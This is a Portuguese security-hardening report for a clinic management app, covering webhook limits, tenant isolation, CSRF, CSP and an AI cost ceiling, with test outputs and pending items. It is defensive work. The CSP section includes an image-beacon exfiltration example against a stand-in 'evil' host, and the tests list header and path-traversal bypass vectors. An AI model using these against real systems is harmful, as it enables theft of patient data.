# Endurecimento local — 2026-09-10

Checkout: `C:\dev\ClinicaOS_V2`, branch `redesign/qoro-ui-v4` (o cabeçalho da primeira rodada dizia `feat/qorov2-pagamentos`; a branch real do checkout é a do redesenho — corrigido aqui). Produto Qoro, pacote `clinicaos`; Node 22.16.0, pnpm 11.17.0, Next 15.5.21, Supabase Auth, Drizzle/Postgres, Meta Cloud API, Asaas e Gemini confirmados no source/package.json. Escopo local; nenhuma publicação, migration do produto ou operação em provedor foi executada. Nada foi commitado: o diff de segurança convive no working tree com ~70 arquivos de UI do redesenho, alterados por outra sessão e preservados intactos.

O orçamento foi aplicado à ordem dos 13 itens do pedido: prioridade de execução e testes para 1–4; um diff verificável por 5–8; 9–13 limitados abaixo. **Não há aceite de risco inventado.** PASS identifica a asserção executada, não liberação global do produto. Teste unitário com dependência substituída está identificado; não comprova comportamento do serviço externo.

## Sumário por peso

Três rodadas consolidadas: **1** — itens 1–8 e a infraestrutura da fase 0; **2** — item 9 (trilha de leitura de prontuário) e os gates de fase 3; **3** — itens 10 e 11 (CSP bloqueante e teto de custo de IA) e a catraca de rota nova. `aceito` não aparece em nenhuma linha porque ninguém assinou nada — ver [riscos.md](./riscos.md).

| Peso | Item | Resultado | Arquivo principal | Comando local |
| --- | --- | --- | --- | --- |
| 9.5 | Webhook externo | **corrigido** (teto de corpo durante a leitura, nos 3 ingressos) | `src/lib/http/webhook-body.ts` | `pnpm security:unit` |
| 9 | Server Action sem guard | **mitigado** (`auditExportLimits` removido; guard e inventário vivo) | `scripts/security/inventory.ts` | `pnpm security:inventory` |
| 9 | IA com escrita | **mitigado** (15 vetores adversariais determinísticos no CI) | `src/contexts/ai-agent/guards/prompt-injection-security.test.ts` | `pnpm security:unit` |
| 8.5 | Autorização no middleware | **mitigado** (decisão já era no servidor; gate AST + 12 vetores de borda) | `scripts/security/local-http.ts` | `pnpm security:http` |
| 8 | Tenant / IDOR | **provado no SQL** (Postgres temporário, RLS real, dois sentidos) | `scripts/security/tenant-isolation.ts` | `pnpm security:tenant` |
| 7 | CSRF de Server Action | **provado sem sessão**; com sessão válida continua pendente | `scripts/security/local-http.ts` | `pnpm security:http` |
| 6.5 | Saída do time / logout | **corrigido** (logout não confirma revogação que falhou) | `src/app/(app)/logout/route.ts` | `pnpm security:unit` |
| 7 | Cookie de sessão | **D126 histórico substituído na retomada local**: sessão Supabase e seletor HttpOnly por geração, consumidores browser removidos, renovação server-side; legado expirado sem cópia e nova autenticação; XSS/CSRF residual separado | `src/lib/auth/supabase-session-cookie.ts` · ADR-037 | validação da emenda em `qorov2.md` §35.6; teste D126 antigo prova apenas o contrato anterior |
| 6 | Segredo no bundle / Sentry | **corrigido** (scrub de body/PII; varredura de canário no bundle) | `src/lib/observability/sentry-scrub.ts` | `pnpm security:bundle` |
| 5 | LGPD — leitura de prontuário | **corrigido na rodada 2** (trilha na mesma tx + gate estático) | `src/contexts/clinical/prontuario-access.ts` | `pnpm security:unit` |
| 3 | CSP | **corrigido na rodada 3**: bloqueante, `connect-src`/`img-src` por origem nomeada, sem `unsafe-eval` | `src/lib/http/content-security-policy.ts` | `pnpm security:http` |
| 3 | Teto de custo de IA | **corrigido na rodada 3**: teto horário por clínica, aplicado antes do provider (antes `checkQuota` não tinha caller) | `src/contexts/ai-agent/internal/quota.ts` | `pnpm security:unit` |
| 2 | E-mail / DNS | **fora de alcance local** | — | — |
| 2 | Higiene | **não se aplica** (sem área pública) | — | — |
| — | Registro de risco com validade | **implementado na rodada 2** (prazo em 2026-12-09) | `scripts/security/risk-register.ts` | `pnpm security:unit` |
| — | Catraca de rota nova sem teste | **implementada na rodada 3** | `scripts/security/inventory-lib.ts` | `pnpm security:inventory` |

## Fase 0 — saídas antes da interpretação

### 0.1 — AST

```text
pnpm exec tsx scripts/security/inventory.ts --snapshot-before --write
actions: 175
routeMethods: 33
props: 14
processEnv: 11
nextPublic: 5
unresolved:
  configuracoes/auditoria/actions.ts#auditExportLimits
  documentos/[id]/pdf/arquivo/route.ts#GET
  prescricoes/[id]/pdf/arquivo/route.ts#GET
```

Snapshot imutável: [inventory-before.json](./inventory-before.json). A versão final amplia a coleta de ambiente de `src` para scripts/configurações; as contagens antes/depois de env têm escopos diferentes, explicitados em [acoes.md](./acoes.md). `resourceGate` dos dois PDFs já existia; classificá-lo resolveu uma lacuna do scanner, não uma vulnerabilidade. As linhas/chamadas e exports estão no inventário gerado. Alcance estático até um guard não prova que ele domina todo ramo.

### 0.2–0.4 — next build + next start reais

```text
pnpm security:build
Next.js 15.5.21
Compiled successfully in 4.1min [baseline]
pnpm security:http [baseline, anterior à remoção de auditExportLimits]
actions: 154
actionRequests: 308
HTTP 307: 142; HTTP 500: 109; HTTP 200: 48; HTTP 404: 7; HTTP 303: 2
csrfNativeRejected: true
```

O primeiro build mostrou erro de resolução do ESLint na cópia; esse resultado isolado não foi tratado como lint aprovado. O runner preserva agora o caminho do config por link, e lint/typecheck são executados separadamente no checkout. Todos os IDs `Next-Action` vêm do manifesto do próprio build. Cada export recebeu uma chamada sem cookie e outra com cookie **inválido**, que atravessa apenas a presença de cookie do middleware. Payload `[]` não prova autorização para entradas válidas; os 500/404 e redirects permanecem **PARTIAL**, não PASS de autorização. Os 48 resultados 200 foram inspecionados: 47 envelopes de negativa/convite inválido e um helper que devolvia `{maxRows:5000}`. Não se encontrou dado clínico nesses envelopes; status 200 sozinho não comprova leitura/escrita autorizada.

Os vetores `x-middleware-subrequest` repetido, `x-nextjs-data:1`, `RSC:1`, `Next-Router-State-Tree` e HEAD deram 401 em `/api/health`. Paths com barra final/duplicada, `/./`, `%2F` e `..%2F` deram rejeição ou redirect, sem 200. O runner usa `node:http` para não normalizar paths antes de enviá-los. OPTIONS sem `Access-Control-Allow-Origin` não é bypass; o preflight não concedeu acesso. Origin `https://evil.test` recebeu 500 e o log do Next registrou `Invalid Server Actions request`, antes da ação. `next.config.ts` configura bodySizeLimit de 4.25 MB e não define allowedOrigins para Server Actions; `allowedDevOrigins` é configuração distinta. Middleware não checa origem. **Sessão Supabase válida e double-submit financeiro não foram provados**; script com controle positivo antes/depois em `scripts/security/authenticated-csrf.ts`, Fase 2.

### 0.5 — ingress externo

Saída por arquivo/linha e testes antes/depois em [webhooks.md](./webhooks.md). Três webhooks reais, 18 crons e callback OTP contradizem a premissa de “apenas health”. Meta já usa HMAC; Asaas usa token constante e consulta autoritativa do pagamento. Asaas alocava o corpo inteiro antes do limite. Não foi inventado HMAC/timestamp incompatível com o contrato implementado.

### 0.6 — Postgres temporário real

```text
pnpm security:tenant
PASS A contra B: SELECT/UPDATE/DELETE estrangeiro=0; SELECT/UPDATE próprio=1; role authenticated
PASS B contra A: SELECT/UPDATE/DELETE estrangeiro=0; SELECT/UPDATE próprio=1; role authenticated
PASS INSERT clinic_id estrangeiro rejeitado por RLS 42501
PASS DELETE próprio permitido
PASS teardown: pacientes + profiles + clínicas = 0
```

O script cria cluster Postgres próprio em loopback, duas clínicas/profiles sintéticos e uma projeção mínima da tabela patients. Aplica os helpers SQL reais de `0006` e a policy patients de `0045`, e chama o `withTenant` real com role `authenticated`. **Não aplica todas as migrations nem autentica dois usuários no Supabase**: comprova isolamento desse caminho SQL, não todos os use cases/IDOR via UI. O primeiro ensaio falhou porque o teste procurava SQLSTATE fora de `error.cause`; corrigida a asserção, o teste passou. O cluster dessa tentativa foi reaberto, teve as seis fixtures removidas e leitura `remaining=0`, e foi parado. Diretórios temporários parados permanecem por bloqueio automático da remoção; só contêm dados sintéticos. Down desta fixture: apagar pacientes/profiles/clínicas criados e parar somente o cluster cujo `data_directory` foi verificado. Não há down do schema do produto porque ele não foi migrado.

### 0.7–0.8 — bundle e acesso

```text
pnpm security:bundle [baseline]
scannedClientFiles: 165
failures: []
```

Build em cópia sem `.env*`, ambiente de processo por allowlist, DB/Auth/Sentry em loopback e canários sintéticos de chaves server-side. O scanner verifica chunks/client HTML por canários, private keys, `sb_secret_` e script Vercel Live; não compara nem lê segredos de `.env.local`. Isso não é detector universal de segredo. DSN e chave publishable são configurações públicas, não credenciais administrativas. A consulta de acessos atuais é `scripts/security/access-inventory.sql` (somente leitura, Fase 2: **NOT TESTED** contra cadastro real).

## Fase 1 — itens 1–4 (prioridade)

| Item / peso | Resultado e diff | Teste executado |
| --- | --- | --- |
| 1 / 9.5 — webhooks | **Corrigido** limite durante a leitura nos dois Asaas; helper `src/lib/http/webhook-body.ts` compartilhado com Meta, cancela stream antes do restante. Autenticação/dedup já presentes, sem alegar nova assinatura. | 8 arquivos, **154/154 PASS**; 14 novos. Stream e HMAC reais; persistência/replay unitários usam dependências simuladas, não prova UNIQUE no Postgres. Comando exato em webhooks.md. |
| 2 / 9 — Server Actions | **Mitigado**: remove `auditExportLimits`, export não usado e sem guard, em `configuracoes/auditoria/actions.ts`. Mantidos entrypoints `requireUser`/`authorizeAction` existentes. `security-actions.test.ts` enumera as 16 exports reais de paciente, exige AuthError401 antes do banco e testa descarte de clinicId/role/amountCents. | **17/17 PASS**; teste de regressão da export sem uso falhou antes da remoção. HTTP usa IDs reais, com limites de cobertura explicitados na Fase 0.2. |
| 3 / 9 — IA | **Mitigado por controles existentes + regressão**: 15 vetores determinísticos em `guards/prompt-injection-security.test.ts`, sobre registry/schemas/políticas reais. Nenhuma tool de prontuário, criação de cobrança ou massa exposta no catálogo testado. | Conjunto IA/privacidade **255/255 PASS**, incluindo os 15 vetores; [saída bruta](./ia-privacidade-tests.json). Não é teste do Gemini nem de disponibilidade 03h/replay de banco. |
| 4 / 8.5 — middleware | **Mitigado**: scanner AST, inventário vivo e gate no pipeline; detecta novas exports/handlers/env e ausência de caminho conhecido de guard. Decisão real já era no servidor. | HTTP health vetores reais rejeitados, 38 testes `tenant-context` e testes AST. Gate estático não prova cobertura de todos os ramos nem substitui E2E. |

O enunciado “todo mundo é de confiança” não foi encontrado como controle de autorização: profile/epoch/permission, token de webhook e RLS são barreiras concretas no source testado. Lacunas descritas acima continuam lacunas; não são apagadas por essa conclusão.

## Itens 5–8 — um diff e um teste por item

| Item / peso | Diff e teste | Limite |
| --- | --- | --- |
| 5 / 8 — tenant/IDOR | `scripts/security/tenant-isolation.ts`, integração SQL acima, **PASS**. Não se alterou RLS funcional só para produzir diff. | HTTP com dois usuários, todos os recursos, suporte e exportação massiva: Fase 2. |
| 6 / 7 — CSRF | `scripts/security/local-http.ts`: request real de Origin hostil + preflight, **PASS** da rejeição nativa; script separado de sessão válida com comentários dos controles positivos. | Sessão válida/double-submit/“todas as ações E2E”: **NOT TESTED**, Fase 2. |
| 7 / 6.5 — saída do time | `logout/route.ts` passa a exigir retorno positivo do epoch e verificar erro retornado por signOut; devolve503 sem confirmar logout incompleto. `logout/route.test.ts`: **5/5 PASS**, mais 38 testes de versão/profile/revogação. | Falha do Auth pode deixar refresh token ativo; agora não é anunciada como sucesso. Revogação efetiva no Auth real e validade/dono de chaves: Fase 2. |
| 8 / 6 — privacidade | `sentry-scrub.ts` elimina body inteiro; `sanitize/keys.ts` redige nome/convênio/body e aliases. Teste com CPF/nome/convênio/body/cookie/authorization: **FAIL antes → PASS depois**; bundle canário sem achados. | Denylist em extra/contexts não cobre prosa em chave arbitrária; região/retention/tags/breadcrumbs sem comprovação global. |

## Itens 9–13

9. **LGPD / peso 5 — CORRIGIDO nesta rodada.** O achado era concreto: `toProntuarioDetail` roda `decryptJson` sobre `content_encrypted`, e as duas telas que chamavam essa projeção — o editor `/pacientes/[id]/prontuarios/[pid]` e o painel do Consultório (`loadAtendimento`) — devolviam o SOAP em claro sem gravar nada em `audit_events`. Só o download de PDF (`clinical.*.pdf_accessed`) e as mutações tinham trilha; a leitura na tela não tinha. Diff: `src/contexts/clinical/prontuario-access.ts` (novo) grava `clinical.prontuario.viewed` na **mesma tx** da leitura, com `user_id` vindo de `requireUser()` — nunca de argumento —, `after` só com metadado (tela de origem, status, versão) e cross-reference em `super_admin_actions` quando a leitura é de suporte impersonando. `queries.ts` perdeu os dois leitores exportados que decifravam sem trilha: `getProntuarioByAppointment` foi **removido** (já não tinha caller) e `getProntuarioById` deixou de ser exportado — sobrevive só para carregar o `before` das mutações, que a própria mutação audita. Teste: `prontuario-access.test.ts` — **9/9 PASS**, com `logAudit` real e tx sintética; cobre identidade da sessão, ausência de conteúdo clínico/ciphertext na linha, `null` sem auditoria, impersonate, e **fail-closed** (audit que falha derruba a leitura). Os três últimos casos são gate estático sobre `src/**`: ninguém fora da lista fechada toca `toProntuarioDetail`, os exports removidos não voltam, e as duas telas continuam chamando o leitor auditado. **Limite:** prova a trilha nesse caminho, não “toda leitura de dado clínico” — prescrição, documento e a listagem por paciente (que não decifra SOAP) seguem fora. Registro de tratamento, base legal e rotina de descarte continuam pendentes com o controlador (`lgpd-registro-tratamento` no registro de risco).

10. **CSP / peso 3 — CORRIGIDO nesta rodada.** O achado real não era "está em Report-Only": era que `connect-src 'self' https: wss:` e `img-src ... https:` deixavam **qualquer** script na página mandar prontuário para **qualquer** host TLS, e o navegador se limitava a reclamar no console. Para dado de saúde, exfiltração é o desfecho que importa. Diff em `src/lib/http/content-security-policy.ts` + `next.config.ts`: (a) o cabeçalho virou `Content-Security-Policy` **bloqueante**; (b) `connect-src` passou a nomear origens — própria origem (que inclui o túnel do Sentry, `tunnelRoute: '/monitoring'`), o projeto Supabase em HTTPS e WSS derivados de `NEXT_PUBLIC_SUPABASE_URL`, e o SDK do Facebook do Embedded Signup; (c) `img-src` fechou pelo mesmo motivo (`new Image().src = 'https://evil/?'+dado` exfiltra igual); (d) `'unsafe-eval'` saiu de script-src — **medido**: `grep -rE "eval\(|new Function\("` nos 161 chunks de cliente do build de produção retornou zero; (e) `frame-src` nomeia os iframes do SDK em vez de herdar. `'unsafe-eval'` volta **somente** quando `NODE_ENV === 'development'`, porque o React Refresh do `next dev` avalia módulos com `eval`. Testes: `content-security-policy.test.ts` **9/9** e `headers-gate.test.ts` **14/14**, mais asserção do cabeçalho **na resposta HTTP real** em `scripts/security/local-http.ts` (`cspEnforced`). O gate agora reprova a volta para Report-Only, esquema solto (`https:`/`wss:`/`http:`), curinga e terceiro não nomeado.

    **O que NÃO foi feito, e por quê:** `script-src` mantém `'unsafe-inline'`. Trocar por nonce exige gerar o nonce no middleware — cujo `matcher` **exclui** `/login`, `/reset-password`, `/convite`, `/auth/*` e `/join`, exatamente as páginas alcançáveis sem sessão. Feito pela metade, endureceria o interior e deixaria a porta da frente como está, parecendo protegido. Some-se a isso que o repositório tem **um** `dangerouslySetInnerHTML` (script constante de tema em `app/layout.tsx`) e nenhum outro sink de HTML controlado por usuário — não há hoje caminho de injeção inline que o nonce fecharia. Registrado como `csp-nonce-inline-script`, com prazo.

11. **Teto de custo de IA / peso 3 — CORRIGIDO nesta rodada.** O achado era pior do que o relatório anterior dizia: `src/contexts/ai-agent/internal/quota.ts` não só devolvia `blocked:false` e `limitUsd: Infinity` — `checkQuota` **não tinha nenhum caller no repositório**. Os tetos existentes (`MAX_TOOL_ROUNDS`, `MAX_MUTATIONS_PER_TURN`, `MAX_PROMPT_CHARS`) limitam UM turno; nada limitava a soma. Diff: `quota.ts` soma `ai_messages.cost_usd` numa janela deslizante de 60 min por clínica e compara com `MAX_AI_COST_USD_PER_CLINIC_WINDOW = 1.0` (constante congelada em `limits.ts`, com a aritmética atual: ~$0,0034/turno a preço introdutório de gemini-3.8-flash ⇒ o teto só é alcançado por volta de ~300 turnos/hora na mesma clínica). O handler do turno ganhou o ramo que faltava: estourou → fallback operacional **sem chamar o provider**, `incrementFallback` escalona para humano, e sai `ai_agent.quota.blocked`. O outcome `quota_blocked` já existia no contrato do evento e o Billing já o ignorava — só nunca tinha sido gerado. Testes: `quota.test.ts` **10/10**, incluindo o SQL montado pelo Drizzle real (escopo por clínica, janela sobre a partition key, sem `date_trunc` do placeholder) e um **gate de ligação** que reprova se o handler parar de chamar `checkQuota`, se o teto passar a rodar depois do `new GeminiProvider()`, ou se o ramo bloqueado voltar a montar contexto/prompt. Residual registrado: `ia-teto-custo-corrida`.

12. **E-mail/DNS / peso 2 — Fase 2.** MX/SPF/DMARC/DKIM, MFA obrigatório do IdP e alertas de DNS dependem do ambiente externo; nenhum achado externo foi afirmado nem consulta externa executada nesta fase (`dns-email-mfa`).

13. **Higiene / peso 2.** SEO/landing pública: **não se aplica** a este escopo interno. Arquivo security.txt/wiki e comportamento de 404 com sessão válida não foram testados; não são entregues como correção.

## Verificação em browser da CSP bloqueante (rodada 3)

Trocar Report-Only por bloqueante é a mudança com maior chance de quebrar o produto sem ninguém perceber até o usuário abrir a tela. Ela foi exercitada, não só testada em unidade.

```text
next start sobre o build isolado (dist/security-local/app), 127.0.0.1:3218
curl -D - http://127.0.0.1:3218/login
Content-Security-Policy: default-src 'self'; base-uri 'self'; form-action 'self';
  frame-ancestors 'none'; object-src 'none';
  script-src 'self' 'unsafe-inline' https://connect.facebook.net;
  frame-src 'self' https://www.facebook.com https://web.facebook.com https://staticxx.facebook.com;
  style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: <supabase>;
  font-src 'self' data:; connect-src 'self' <supabase-http> <supabase-ws>
  https://www.facebook.com https://graph.facebook.com
(sem Content-Security-Policy-Report-Only)
```

A página renderizou por inteiro (tipografia, ilustração do preview, estilos) e o React hidratou: clique no campo de e-mail, digitação e leitura do valor no input controlado devolveram `{ hydrated: true, reactAttached: true, typed: 'teste@qoro.dev' }`. Nenhum script, estilo ou fonte foi bloqueado.

**O console apontou um bloqueio — e ele rendeu um achado.** O SDK do Sentry tentou `connect` direto ao host do DSN em vez de sair pelo túnel same-origin. A causa está no próprio bundle de produção: o `tunnelRoute` só é aplicado quando o host do DSN casa `^o(\d+)\.ingest(?:\.([a-z]{2}))?\.sentry\.io$`; caso contrário o SDK envia direto. O build isolado usa um DSN canário em loopback, que não casa — daí o bloqueio. O DSN real (`o4511646337466368.ingest.us.sentry.io`) casa, então em produção o túnel engata e `connect-src 'self'` basta.

Isso deixou de ser suposição e virou gate: `headers-gate.test.ts` reprova se `tunnelRoute` sumir do config ou se o DSN embutido no cliente deixar de casar o padrão. Sem ele, trocar o DSN (self-hosted, outra região, proxy) mataria em silêncio todo o relato de erro do cliente — e busca vazia é indistinguível de "está tudo bem".

**Limite honesto:** foi exercitada a página de login e o shell do Next. Telas autenticadas e o fluxo do Embedded Signup do WhatsApp **não** foram abertos — exigem sessão Supabase local, que continua na Fase 2. As origens do Facebook na política vieram da leitura do SDK e de `ALLOWED_FB_ORIGINS` no source, não de um fluxo executado.

## Fase 2 — pendências concretas, sem aceite implícito

| O que falta | Comando / local | Risco de adiar | Estado |
| --- | --- | --- | --- |
| Autenticação local válida e CSRF | Preparar Supabase Auth **local**, usuário com VIEW_PATIENT, salvar cookie fora do repo e executar `pnpm exec tsx scripts/security/authenticated-csrf.ts <cookie-file-local> http://127.0.0.1:3217` com next start do build apontando ao Auth local. | Regressão entre controle nativo, sessão e fluxo válido não coberta. | NOT TESTED |
| Todas as ações/IDOR com entradas válidas | Preparar schema completo/seed local; adaptar os E2E cross-tenant existentes para esses dois usuários, sem produção. | 500 por payload inválido não prova autenticação nem tenant. | NOT TESTED |
| Replay persistido de todos webhooks | Banco local com schema completo; repetir ID assinado/token válido e conferir linhas/outbox antes/depois. | Teste unitário não comprova constraint/transação real. | NOT TESTED |
| Gemini adversarial (o teto horário saiu daqui: foi implementado na rodada 3) | Script existente `scripts/ai-adversarial-check.ts` exige revisão do destino/credenciais pelo humano antes de executar. Não foi executado neste trabalho local. | Política determinística não mede a resposta do modelo. | NOT TESTED |
| Inventário de acesso/rotação | `psql <URL-LOCAL> -v ON_ERROR_STOP=1 -f scripts/security/access-inventory.sql`; preencher dono, finalidade, emitida em, rotacionada em e válida até para Supabase secret, Meta app/token, Asaas API/webhook, Gemini, Redis, Sentry upload, CRON e chaves HMAC/crypto. | Chave sem proprietário/expiração operacional rastreada. | NOT TESTED |
| Sentry/Vercel | Settings de projeto: ingestão/região/retention; deployment: toolbar/protection/headers. DSN público não justifica alegar vazamento de credencial administrativa. | Saída de dado/controle de scripts sem prova no deployment. | NOT TESTED |
| DNS/e-mail | Console do domínio/IdP: SPF, DKIM, DMARC, MFA; inventariar endereços @qoro.dev com responsável. | Recuperação de conta exposta ao canal de e-mail. | NOT TESTED |

Essas linhas deixaram de ser prosa: viraram [riscos.md](./riscos.md), gerado de `scripts/security/risk-register.ts` e **aplicado por teste**. Toda entrada está com `status: pendente`, `dono: pendente do humano`, `registradoEm: 2026-09-10` e `revisarEm: 2026-12-09` — pendência não é aceite. Um aceite de verdade exige `status: aceito`, dono com nome e `validoAte`; o gate recusa aceite sem prazo, aceite anônimo, aceite vencido e revisão vencida. **Consequência assumida:** em 2026-12-09 o CI fica vermelho até alguém reabrir os itens. É o comportamento pedido — aceite sem prazo vira política do sistema por dez anos.

## Fase 3 — o que ficou travado no pipeline

O comando atual tem sete etapas: `pnpm security:check` = `security:inventory && security:unit && security:tenant && security:build && security:browser-session && security:bundle && security:http`. `security:browser-session` usa `playwright.httponly.config.ts` e requer Chromium instalado (`pnpm exec playwright install chromium`). O CI (`.github/workflows/ci.yml`) roda inventário, isolamento de duas clínicas, build isolado, bundle e HTTP como passos próprios; os gates unitários entram pela suíte Vitest (`pnpm test:coverage`). Após autorização explícita em 15/09, o patch foi aplicado: `pnpm test:e2e:ci && pnpm security:browser-session`. O comando exato passou localmente (6 públicos PASS, 2 skips Turnstile, 6 HttpOnly PASS), e `actionlint` 1.7.12 PASS; publicação e execução remota da emenda continuam **NOT TESTED**.

Na emenda de 14–15/09/2026, a sessão usa `sb-<project>-auth-token-v2-<geração>`, com geração de 32 caracteres hexadecimais, e seletor `qoro-auth-session`, ambos HttpOnly, Lax e Secure em produção. Login, OTP e login final de `/join` criam uma geração nova e gravam o seletor depois dos fragmentos. Refresh nunca grava nem apaga o seletor, mesmo em falha; uma resposta atrasada só pode escrever cookies da geração antiga. Logout, troca de conta e reset removem o seletor; OTP inválido também deixa a identidade anterior desvinculada. O middleware expira cookies legados e órfãos, sem copiar bearer ou reemitir cookies ativos. O cutover exige uma nova autenticação para a sessão legada.

A prova usa Chromium real contra o build Next de produção isolado e, no convite, o SDK SSR instalado sobre Auth HTTP sintético em loopback. **Não executa GoTrue/Supabase externo.** Rollout e revogação pelo provedor são **NOT TESTED** nesta emenda. O seletor impede refresh atrasado de reativar a identidade no navegador; não é prova de revogação de bearer copiado externamente nem de correção da janela epoch → `signOut` no logout. Evidência atual em [Qoro v2 §35.6](../qorov2.md); as saídas numéricas das rodadas anteriores abaixo permanecem históricas.

Gate a gate, contra a lista pedida — sem arredondar “parcial” para “feito”:

| Gate pedido | Estado | Onde |
| --- | --- | --- |
| CSP é bloqueante e não volta a Report-Only | **implementado (rodada 3)** | `src/lib/security/headers-gate.test.ts` |
| CSP não afrouxa (esquema solto, curinga, terceiro anônimo) | **implementado**, e conferido também no cabeçalho HTTP real | `headers-gate.test.ts` + `local-http.ts` |
| Origem coringa em Server Action | **implementado** (`allowedOrigins` e `allowedDevOrigins`) | `headers-gate.test.ts` |
| Server Action/rota nova fora da lista viva ou sem guard | **implementado** (`REVIEW_REQUIRED` reprova) | `scripts/security/inventory.ts --check` |
| `vercel.live` no bundle de produção | **implementado** | `scripts/security/bundle-check.ts` |
| `NEXT_PUBLIC_` sem entrada no registro | **implementado**, nos dois sentidos: nome sem dono reprova, e entrada que o código não usa mais também | `public-env-registry.ts` + `publicEnvironmentDrift` |
| `/api/health` cedendo aos vetores de borda | **implementado** (12 vetores) | `scripts/security/local-http.ts` |
| Leitura de prontuário sem trilha | **implementado** | `src/contexts/clinical/prontuario-access.test.ts` |
| Teto de custo de IA desligado do handler | **implementado (rodada 3)** — reprova se `checkQuota` perder o caller ou correr depois do provider | `src/contexts/ai-agent/internal/quota.test.ts` |
| Rota nova sem teste | **implementado (rodada 3)** como catraca: rota nova exige `route.test.ts`; rota que já tinha não pode perder | `routeTestDrift` + `route-test-ratchet.test.ts` |
| Registro de aceite de risco com validade | **implementado** | `risk-register.ts` + `risk-register.test.ts` |
| Legado legível, confirmação HttpOnly e renovação sem loop no navegador | **implementado no pipeline local e workflow**; emenda remota NOT TESTED | `security-e2e/http-only-session.spec.ts` + `playwright.httponly.config.ts` |
| CSP com nonce (sem `unsafe-inline`) | **não implementado**, com razão escrita | `csp-nonce-inline-script` em riscos.md |
| CSRF com sessão válida | **não implementado** | `csrf-sessao-valida` em riscos.md |

Isolamento de duas clínicas, CSRF de origem forjada (sem sessão), prompt injection, build isolado e grep de segredo no bundle rodam no CI. **CI remoto/Linux: NOT TESTED** — nada foi enviado; `security:tenant` no CI depende de `pg_config --bindir` resolver no runner, o que só a primeira execução remota confirma.

Cada pessoa precisa Node22, pnpm11.17 e Postgres com `initdb`, `postgres`, `pg_ctl`. `.env.example` descreve `SECURITY_PG_BIN`; os scripts locais não exigem criar segredo nem ler `.env.local`. Runtime do produto autenticado exige setup local separado. Não é necessário console de produção para reproduzir os testes executados.

## Validação final da rodada de 10/09/2026 — histórico

`pnpm security:check` executado ponta a ponta, em processo único, sobre o estado final daquela rodada, antes da emenda HttpOnly por geração de 14–15/09:

```text
$ pnpm security:check
$ tsx scripts/security/inventory.ts --check
{ "actions": 174, "routeMethods": 33, "props": 14, "processEnv": 174, "nextPublic": 5,
  "unresolved": [],
  "publicEnv": { "unregistered": [], "stale": [], "restricted": [] },
  "routeTests": { "missingForNew": [], "regressed": [] } }

$ vitest run <18 arquivos focados>
Test Files  18 passed (18)
     Tests  232 passed (232)

$ tsx --conditions=react-server scripts/security/tenant-isolation.ts
PASS A contra B: SELECT/UPDATE/DELETE estrangeiro=0; SELECT/UPDATE próprio=1; role authenticated
PASS B contra A: SELECT/UPDATE/DELETE estrangeiro=0; SELECT/UPDATE próprio=1; role authenticated
PASS INSERT clinic_id estrangeiro rejeitado por RLS 42501
PASS DELETE próprio permitido
PASS teardown: pacientes + profiles + clínicas = 0

$ tsx scripts/security/local-build.ts
✓ Compiled successfully in 3.4min

$ tsx scripts/security/bundle-check.ts
{ "scannedClientFiles": 166, "failures": [] }

$ tsx scripts/security/local-http.ts
{ "healthVectors": 12, "actions": 153, "actionRequests": 306,
  "action200WithExplicitDenial": 47, "csrfNativeRejected": true,
  "cspEnforced": true, "cspDirectives": 11 }

EXIT=0
```

Os 232 testes focados eram 166 na rodada 1: cresceram com o leitor auditado de prontuário, o teto de custo de IA, a catraca de rota, os atributos de cookie e os gates de cabeçalho/risco. `cspEnforced: true` com `cspReportOnly: ""` foi verificado nas **306** respostas do harness, não só numa página.

**Um percalço que virou correção, e não deve ser lido como aprovação silenciosa.** Numa execução intermediária `/api/health` respondeu **500 onde deve responder 401**. A causa não era do produto: uma queda de energia interrompeu um build e deixou `dist/security-local/app/.next` truncado (apenas 2 manifestos em `.next/server/`); o build seguinte considerou o cache válido e as verificações rodaram contra um artefato que não correspondia ao source. `scripts/security/local-build.ts` passou a **apagar a saída anterior antes de copiar** — um fixture que envelhece em silêncio é pior que um que falha, porque passa parecendo verde. O mesmo episódio expôs um erro de tipo real em `hardenCookie` que o Vitest não pegava (esbuild não faz typecheck): a interseção colapsava para `never`. Corrigido com `Omit`.

Dois pipelines chegaram a rodar em paralelo sobre o mesmo log e o mesmo `dist/`, e os resultados daquelas duas execuções foram **descartados** — não entram neste relatório. A saída acima é de uma execução única, depois de encerrar todo processo Node pendente.

Artefatos brutos ficam em `dist/security-local/` (gitignored); os documentos deste diretório preservam os resultados resumidos e o inventário rastreável. Oito diretórios `qoro-security-pg-*` permanecem em `%TEMP%` de execuções do fixture de tenant: clusters **parados**, com dados sintéticos apenas, e a remoção continua bloqueada pela política automática do ambiente.
